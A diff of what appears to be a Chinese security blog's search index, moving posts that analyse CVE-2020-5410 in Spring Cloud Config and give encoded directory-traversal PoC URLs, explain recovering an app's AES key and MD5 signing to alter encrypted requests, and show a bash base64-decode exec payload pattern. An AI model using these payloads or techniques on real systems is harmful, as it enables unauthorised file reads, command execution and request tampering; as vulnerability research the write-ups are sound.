@@ -143,79 +143,53 @@
 ]]></content>
   </entry>
   <entry>
-    <title>CVE-2020-5410 Spring Cloud Config目录遍历漏洞（新）</title>
-    <url>/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/</url>
-    <content><![CDATA[<p>Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。</p>
+    <title>通过JS解开加密传输</title>
+    <url>/2020/04/03/JS-Decrypt/</url>
+    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
+<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
+</blockquote>
+<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
+<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
 <a id="more"></a>
 
-<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><a href="https://github.com/spring-cloud/spring-cloud-config/compare/v2.2.2.RELEASE...v2.2.3.RELEASE" target="_blank" rel="noopener">对比2.2.2和2.2.3版本</a>，发现其中有两个commits似乎和漏洞修复有关。</p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/commits.png" alt="commits"></p>
-<p><a href="https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c" target="_blank" rel="noopener">查看对比</a>发现在<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/environment/EnvironmentController.java</code>中多了一个<code>pathUtils.isInvalidEncodedLocation</code>判断。</p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/diff-2.2.2.png" alt="diff-2.2.2"></p>
-<p>为了搞明白为什么要多加一个<code>pathUtils.isInvalidEncodedLocation</code>判断，查看<code>Environment.normalize()</code>，发现是将<code>SLACH_PLACEHOLDER</code>替换成<code>/</code>，<code>SLACH_PLACEHOLDER</code>为<code>(_)</code>。看到这里，是不是就想起了在CVE-2020-5405中利用<code>(_)</code>代替<code>/</code>绕过检测的方法。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">normalize</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s != <span class="keyword">null</span> &amp;&amp; s.contains(SLASH_PLACEHOLDER)) &#123;</span><br><span class="line">		<span class="comment">// "(_)" is uncommon in a git repo name, but "/" cannot be matched</span></span><br><span class="line">		<span class="comment">// by Spring MVC</span></span><br><span class="line">		<span class="keyword">return</span> s.replace(SLASH_PLACEHOLDER, <span class="string">"/"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
+<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
+<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
+<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
+<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
+<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
+<p>偏移量iv：<code>0108489312380708</code></p>
+<p>AES加解密的过程如下图，还是比较清晰的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
+<p>下图是调试过程，密钥就直接拿到了：</p>
+<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
+<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
+<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
+<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
+<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
+<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
+<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
+<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
+<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
+<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
+<p>通过调试可以知道，D是：（去除了\）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-
-
-<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
-<p>调试所使用版本为<code>spring-cloud-config-2.2.2.RELEASE</code></p>
-<p>和CVE-2020-5405一样需要，更将configserver.yml改成本地配置</p>
-</blockquote>
-<p>和前面两个漏洞（CVE-2019-3799和CVE-2020-5405）类似，也是拼接了传入的值，而传入的值能够通过URL二次编码和<code>(_)</code>替换绕过路径检测，实现任意文件读取。但触发任意文件读取的函数和入口不一样。</p>
-<p>在<code>EnvironmentController.java</code>中找到<code>getEnvironment</code>方法，其中可控的参数为<code>name</code>、<code>profiles</code>和<code>label</code>，调试步进<code>findOne</code>方法</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getEnvironment.png" alt="debug-getEnvironment" style="zoom:45%;">
-
-
-
-<p><code>NativeEnvironmentRepository.java</code>中的<code>getArgs</code>中存在对我们可控参数<code>name</code>、<code>profiles</code>和<code>label</code>的处理，步进该方法进行查看。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-findOne.png" alt="debug-findOne" style="zoom:45%;">
-
-
-
-<p>在<code>getArgs()</code>方法中看到熟悉的<code>getLocations()</code>，这里可能存在路径拼接</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getArgs.png" alt="debug-getArgs" style="zoom:45%;">
-
-
-
-<p>果然，在<code>getLocations()</code>方法中进行了路径的拼接，将<code>location</code>和<code>label</code>参数拼接在一起</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getLocations.png" alt="debug-getLocations" style="zoom:45%;">
-
-
-
-<p>光有<code>location</code>的拼接并不能产生文件读取，还得找到读取文件名的控制。</p>
-<p>经过一段时间的调试，最终发现在<code>builder.run</code>中发现整个路径的拼接。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-builder-run.png" alt="debug-builder-run" style="zoom:45%;">
-
-
-
-<p>整个过程调用栈比较长，调试起来比较麻烦，知道这里将<code>search-locations</code>+<code>label</code>+<code>name</code>拼接起来就行（上面代码中447行中的<code>location</code>是<code>search-locations</code>+<code>label</code>的结果）。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-stack.png" alt="debug-stack" style="zoom:45%;">
-
-
-
-<p><code>load</code>方法如下</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-load.png" alt="debug-load" style="zoom:45%;">
-
-<p><code>load</code>方法调用<code>loadForFileExtension</code>方法，在其中发现整个文件路径的拼接</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-loadForFileExtension.png" alt="debug-loadForFileExtension" style="zoom:45%;">
-
-
-
-<p>注意拼接后还带上了 <code>&quot;-&quot; + profile + fileExtension</code>，虽然<code>profile</code>和<code>fileExtension</code>都是可控的，但是这个<code>-</code>比较难处理。<code>-</code>的存在会导致绝大部分文件都无法被读取。</p>
-<p>注意到修复中将<code>#</code>做了限制，根据<code>#</code>在URL中的特性猜测<code>#</code>会使后面的字符变成标识符，不会被识别。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/location-contain-sharp.png" alt="location-contain-sharp" style="zoom:45%;">
-
-
-
-<p>构造PoC进行请求后发现果然能用<code>#</code>“注释”后面的内容。</p>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>PoC：<a href="http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29" target="_blank" rel="noopener">http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</a> </p>
-<p><code>test.txt</code>文件中的内容为<code>just for test</code>，可以看到其中存在多处文件信息回显。因为<code>file:/tmp//test.txt#-seikei.xml</code>中<code>#</code>后面的字符不会被解析，等于访问的是<code>file:/tmp//test.txt</code>。</p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc1.png" alt="poc1"></p>
-<p>由于整个文件路径是由<code>label</code>和<code>name</code>进行的拼接，所以也可以在<code>name</code>处输入路径回溯符。</p>
-<p>测试之后发现同样会返回文件内容。</p>
-<p>PoC2：<a href="http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test" target="_blank" rel="noopener">http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test</a> </p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc2.png" alt="poc2"></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7877" target="_blank" rel="noopener">https://xz.aliyun.com/t/7877</a></p>
+<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
+<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
+<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
+<p>然后复制n和iv的值</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
+<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
+<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
+<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
+<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
 ]]></content>
   </entry>
   <entry>
@@ -410,56 +384,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>通过JS解开加密传输</title>
-    <url>/2020/04/03/JS-Decrypt/</url>
-    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
-<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
-</blockquote>
-<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
-<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
-<a id="more"></a>
-
-<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
-<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
-<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
-<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
-<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
-<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
-<p>偏移量iv：<code>0108489312380708</code></p>
-<p>AES加解密的过程如下图，还是比较清晰的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
-<p>下图是调试过程，密钥就直接拿到了：</p>
-<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
-<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
-<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
-<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
-<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
-<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
-<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
-<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
-<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
-<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
-<p>通过调试可以知道，D是：（去除了\）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
-<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
-<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
-<p>然后复制n和iv的值</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
-<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
-<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
-<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
-<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java Runtime.getRuntime().exec()碰到的问题</title>
     <url>/2020/07/18/Java-Runtime.getRuntime.exec/</url>
     <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在CVE-2020-5902 F5-BigIP-TMUI远程代码执行漏洞分析中<code>WorkspaceUtils.saveFile()</code>碰到这么一段代码。</p>
@@ -537,6 +461,131 @@
 <p>若是使用数组形式传递命令，数组中单个元素只作为单一参数去执行，不会因为空格等字符就分开执行。</p>
 <p>若是<code>/bin/bash</code>形式的命令执行，仍可以用<code>bash -c {echo,base64的payload}|{base64,-d}|{bash,-i}</code>执行多条命令。</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>CVE-2020-5410 Spring Cloud Config目录遍历漏洞（新）</title>
+    <url>/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/</url>
+    <content><![CDATA[<p>Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。</p>
+<a id="more"></a>
+
+<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><a href="https://github.com/spring-cloud/spring-cloud-config/compare/v2.2.2.RELEASE...v2.2.3.RELEASE" target="_blank" rel="noopener">对比2.2.2和2.2.3版本</a>，发现其中有两个commits似乎和漏洞修复有关。</p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/commits.png" alt="commits"></p>
+<p><a href="https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c" target="_blank" rel="noopener">查看对比</a>发现在<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/environment/EnvironmentController.java</code>中多了一个<code>pathUtils.isInvalidEncodedLocation</code>判断。</p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/diff-2.2.2.png" alt="diff-2.2.2"></p>
+<p>为了搞明白为什么要多加一个<code>pathUtils.isInvalidEncodedLocation</code>判断，查看<code>Environment.normalize()</code>，发现是将<code>SLACH_PLACEHOLDER</code>替换成<code>/</code>，<code>SLACH_PLACEHOLDER</code>为<code>(_)</code>。看到这里，是不是就想起了在CVE-2020-5405中利用<code>(_)</code>代替<code>/</code>绕过检测的方法。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">normalize</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s != <span class="keyword">null</span> &amp;&amp; s.contains(SLASH_PLACEHOLDER)) &#123;</span><br><span class="line">		<span class="comment">// "(_)" is uncommon in a git repo name, but "/" cannot be matched</span></span><br><span class="line">		<span class="comment">// by Spring MVC</span></span><br><span class="line">		<span class="keyword">return</span> s.replace(SLASH_PLACEHOLDER, <span class="string">"/"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
+<p>调试所使用版本为<code>spring-cloud-config-2.2.2.RELEASE</code></p>
+<p>和CVE-2020-5405一样需要，更将configserver.yml改成本地配置</p>
+</blockquote>
+<p>和前面两个漏洞（CVE-2019-3799和CVE-2020-5405）类似，也是拼接了传入的值，而传入的值能够通过URL二次编码和<code>(_)</code>替换绕过路径检测，实现任意文件读取。但触发任意文件读取的函数和入口不一样。</p>
+<p>在<code>EnvironmentController.java</code>中找到<code>getEnvironment</code>方法，其中可控的参数为<code>name</code>、<code>profiles</code>和<code>label</code>，调试步进<code>findOne</code>方法</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getEnvironment.png" alt="debug-getEnvironment" style="zoom:45%;">
+
+
+
+<p><code>NativeEnvironmentRepository.java</code>中的<code>getArgs</code>中存在对我们可控参数<code>name</code>、<code>profiles</code>和<code>label</code>的处理，步进该方法进行查看。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-findOne.png" alt="debug-findOne" style="zoom:45%;">
+
+
+
+<p>在<code>getArgs()</code>方法中看到熟悉的<code>getLocations()</code>，这里可能存在路径拼接</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getArgs.png" alt="debug-getArgs" style="zoom:45%;">
+
+
+
+<p>果然，在<code>getLocations()</code>方法中进行了路径的拼接，将<code>location</code>和<code>label</code>参数拼接在一起</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getLocations.png" alt="debug-getLocations" style="zoom:45%;">
+
+
+
+<p>光有<code>location</code>的拼接并不能产生文件读取，还得找到读取文件名的控制。</p>
+<p>经过一段时间的调试，最终发现在<code>builder.run</code>中发现整个路径的拼接。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-builder-run.png" alt="debug-builder-run" style="zoom:45%;">
+
+
+
+<p>整个过程调用栈比较长，调试起来比较麻烦，知道这里将<code>search-locations</code>+<code>label</code>+<code>name</code>拼接起来就行（上面代码中447行中的<code>location</code>是<code>search-locations</code>+<code>label</code>的结果）。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-stack.png" alt="debug-stack" style="zoom:45%;">
+
+
+
+<p><code>load</code>方法如下</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-load.png" alt="debug-load" style="zoom:45%;">
+
+<p><code>load</code>方法调用<code>loadForFileExtension</code>方法，在其中发现整个文件路径的拼接</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-loadForFileExtension.png" alt="debug-loadForFileExtension" style="zoom:45%;">
+
+
+
+<p>注意拼接后还带上了 <code>&quot;-&quot; + profile + fileExtension</code>，虽然<code>profile</code>和<code>fileExtension</code>都是可控的，但是这个<code>-</code>比较难处理。<code>-</code>的存在会导致绝大部分文件都无法被读取。</p>
+<p>注意到修复中将<code>#</code>做了限制，根据<code>#</code>在URL中的特性猜测<code>#</code>会使后面的字符变成标识符，不会被识别。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/location-contain-sharp.png" alt="location-contain-sharp" style="zoom:45%;">
+
+
+
+<p>构造PoC进行请求后发现果然能用<code>#</code>“注释”后面的内容。</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>PoC：<a href="http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29" target="_blank" rel="noopener">http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</a> </p>
+<p><code>test.txt</code>文件中的内容为<code>just for test</code>，可以看到其中存在多处文件信息回显。因为<code>file:/tmp//test.txt#-seikei.xml</code>中<code>#</code>后面的字符不会被解析，等于访问的是<code>file:/tmp//test.txt</code>。</p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc1.png" alt="poc1"></p>
+<p>由于整个文件路径是由<code>label</code>和<code>name</code>进行的拼接，所以也可以在<code>name</code>处输入路径回溯符。</p>
+<p>测试之后发现同样会返回文件内容。</p>
+<p>PoC2：<a href="http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test" target="_blank" rel="noopener">http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test</a> </p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc2.png" alt="poc2"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7877" target="_blank" rel="noopener">https://xz.aliyun.com/t/7877</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
+    <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
+    <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/springboot-directory.png" alt="springboot-directory" style="zoom:33%;">
+
+<a id="more"></a>
+
+<p>Java代码都在<code>src/main/java/</code>目录下，<code>src/main/resources/</code>中放置资源文件。</p>
